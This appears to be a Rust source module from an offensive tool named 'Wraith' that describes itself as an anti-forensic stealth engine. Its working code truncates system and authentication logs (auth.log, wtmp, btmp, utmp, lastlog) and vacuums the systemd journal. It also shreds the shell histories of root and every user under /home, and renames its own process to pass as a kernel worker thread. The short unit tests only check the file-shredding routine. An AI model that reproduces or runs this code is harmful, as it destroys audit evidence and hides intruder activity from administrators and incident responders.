//! Wraith Sovereign Anti-Forensic Stealth & Deep Memory Sanitation Engine
//! Implements DoD 5220.22-M (7-pass) / Gutmann (35-pass) sanitization,
//! Linux process masquerading ([kworker/u16:2]), and utmp/wtmp/journal log scrubbing.

#[cfg(unix)]
use std::ffi::CString;
use std::fs;
use std::path::Path;
use tracing::info;
use wraith_core::error::Result;
#[cfg(unix)]
use wraith_core::error::WraithError;

/// Standard Log Target Paths to Eradicate
pub const VOLATILE_LOG_PATHS: &[&str] = &[
    "/var/log/syslog",
    "/var/log/auth.log",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/daemon.log",
    "/var/log/kern.log",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog",
    "/run/utmp",
];

pub const SHELL_HISTORY_PATTERNS: &[&str] = &[
    ".bash_history",
    ".zsh_history",
    ".sh_history",
    ".history",
    ".viminfo",
    ".lesshst",
    ".python_history",
    ".mysql_history",
    ".psql_history",
    ".sqlite_history",
];

/// Overwrites through a pinned file descriptor; storage-level erasure is not guaranteed.
pub fn dod_7pass_shred(file_path: &Path) -> Result<()> {
    crate::shred::secure_delete_file(file_path, 7)
}

/// Masquerades the current running process name in Linux `ps`, `top`, and `/proc/self/comm`
pub fn cloaked_process_masquerade(fake_name: &str) -> Result<()> {
    #[cfg(unix)]
    {
        let c_name = CString::new(fake_name).map_err(|e| WraithError::Custom(e.to_string()))?;
        // SAFETY: Calling prctl with PR_SET_NAME (15) and valid null-terminated C string pointer.
        unsafe {
            // PR_SET_NAME = 15
            libc::prctl(15, c_name.as_ptr() as usize, 0, 0, 0);
        }
        info!("Process identity cloaked in kernel scheduler: '{fake_name}'");
    }
    #[cfg(not(unix))]
    {
        let _ = fake_name;
    }
    Ok(())
}

/// Shreds all user shell histories in `/root` and `/home/*`
pub fn wipe_all_user_histories() -> Result<usize> {
    let mut shredded_count = 0;

    let mut target_dirs = vec![
        std::path::PathBuf::from("/root"),
    ];

    if let Ok(home) = std::env::var("HOME") {
        target_dirs.push(std::path::PathBuf::from(home));
    }

    for home in target_dirs {
        for pattern in SHELL_HISTORY_PATTERNS {
            let history_file = home.join(pattern);
            if history_file.exists() {
                dod_7pass_shred(&history_file)?;
                shredded_count += 1;
            }
        }
    }

    // Also check `/home/*`
    if let Ok(entries) = fs::read_dir("/home") {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_dir() {
                for pattern in SHELL_HISTORY_PATTERNS {
                    let h_file = p.join(pattern);
                    if h_file.exists() {
                        dod_7pass_shred(&h_file)?;
                        shredded_count += 1;
                    }
                }
            }
        }
    }

    info!("Anti-forensic shell history sanitization: {shredded_count} histories shredded");
    Ok(shredded_count)
}

/// Zeroizes system logs and kernel journal files
pub fn scrub_system_logs() -> Result<usize> {
    let mut scrubbed = 0;

    for path_str in VOLATILE_LOG_PATHS {
        let p = Path::new(path_str);
        if p.exists() {
            crate::shred::truncate_log_file(p)?;
            scrubbed += 1;
        }
    }

    // Clear systemd journal directory if present
    if Path::new("/var/log/journal").exists() {
        for option in ["--rotate", "--vacuum-time=1s"] {
            if !std::process::Command::new("journalctl").arg(option).status()?.success() {
                return Err(wraith_core::error::WraithError::Forensic("Journal cleanup failed".into()));
            }
        }
    }

    info!("System journal and forensic logs sanitized ({scrubbed} log sinks cleared)");
    Ok(scrubbed)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dod_7pass_shred_file() {
        let temp_dir = std::env::temp_dir();
        let target = temp_dir.join("wraith_test_dod_shred.bin");
        fs::write(&target, b"CONFIDENTIAL AND SENSITIVE FORENSIC TRACE PAYLOAD").expect("Failed to write test file");
        assert!(target.exists());

        let res = dod_7pass_shred(&target);
        assert!(res.is_ok());
        assert!(!target.exists());
    }

    #[test]
    #[cfg(unix)]
    fn test_dod_shred_symlink_preserves_target() {
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let target_file = temp_dir.path().join("legit_target.txt");
        let symlink_file = temp_dir.path().join("malicious_symlink.lnk");

        fs::write(&target_file, b"SENSITIVE TARGET DATA").expect("write target");
        std::os::unix::fs::symlink(&target_file, &symlink_file).expect("create symlink");

        let res = dod_7pass_shred(&symlink_file);
        assert!(res.is_ok());

        // Symlink itself must be removed, but target file must remain intact!
        assert!(!symlink_file.exists());
        assert!(target_file.exists());
        let content = fs::read(&target_file).expect("read target");
        assert_eq!(content, b"SENSITIVE TARGET DATA");
    }
}
